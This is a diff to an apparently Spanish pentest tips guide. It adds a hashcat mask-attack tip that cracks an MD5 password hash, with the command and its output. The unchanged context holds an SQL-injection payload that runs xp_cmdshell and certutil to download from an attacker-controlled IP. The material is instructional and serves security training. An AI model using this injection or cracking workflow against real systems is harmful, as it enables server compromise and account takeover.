@@ -790,3 +790,35 @@ Una vez hecho esto podemos ejecutar comandos a nivel de sistema:
 inyeccion';EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.X.X';--
 ```
 Para una mayor información visitar el siguiente enlace: https://www.tarlogic.com/es/blog/red-team-tales-0x01/ , también es comun que los comandos no se ejecuten de forma de "stacked querys"
+
+## Tip #24: Patrones personalizados en Hashcat
+Si en algun momento obtienes un hash y ademas conoces el patrón del mismo puedes especificarselo a hashcat para que lo obtenga, por ejemplo veamos el siguiente caso de estudio:
+### Caso de estudio
+Se obtuvo el hash ```18b51996755d15f6fad915461f866e66``` y ademas el codigo fuente que calcula el hash de las contraseñas, en el cual destacan las siguientes lineas:
+```python
+# Ingresar los ultimos 5 digitos de su matricula de empleado
+def cifrar_md5(texto):
+    md5 = hashlib.md5()
+```
+La información que tenemos es la siguiente, el hash, el tipo de cifrado (md5) y el patrón, es decir sabemos que son 5 digitos.
+### Uso de patrones en hashcat
+Una vez identificada la información anterior ejecutaremos el siguiente comando ```hashcat -m <hash_type> -a 3 <hash_file> ?a?a?a?a?a``` en donde la sentencia ```?a?a?a?a?a``` especifica a hashcat que hara fuerza bruta buscando 5 caracteres alfanumericos, el resultado se ve de la siguiente forma:
+```bash
+┌──(jorge㉿pentest)-[~]
+└─$ hashcat -m 0 -a 3 hash_pass.txt ?a?a?a?a?a                 
+hashcat (v6.2.6) starting
+
+18b51996755d15f6fad915461f866e66:73458                    
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 18b51996755d15f6fad915461f866e66
+Time.Started.....: Fri Jan 24 17:45:30 2025 (3 secs)
+Time.Estimated...: Fri Jan 24 17:45:33 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: ?a?a?a?a?a [5]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 99074.4 kH/s (2.14ms) @ Accel:512 Loops:95 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+```
